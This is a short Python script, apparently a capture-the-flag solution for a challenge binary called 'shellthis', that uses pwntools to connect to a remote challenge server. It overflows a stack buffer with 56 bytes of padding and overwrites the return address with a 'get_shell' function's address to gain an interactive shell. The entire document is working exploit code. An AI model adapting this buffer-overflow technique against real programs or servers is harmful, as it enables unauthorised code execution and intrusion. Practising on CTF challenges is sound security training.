from pwn import *

q = ELF('./shellthis')
r = remote('chal.duc.tf', 30002)
#r = process('./shellthis')
binshSearch = q.symbols['get_shell']
log.info('binsh: {}'.format(hex(binshSearch)))

buf = b''
buf += b'A' * 56
#48
buf += p64(binshSearch)

r.sendline(buf)
r.interactive()
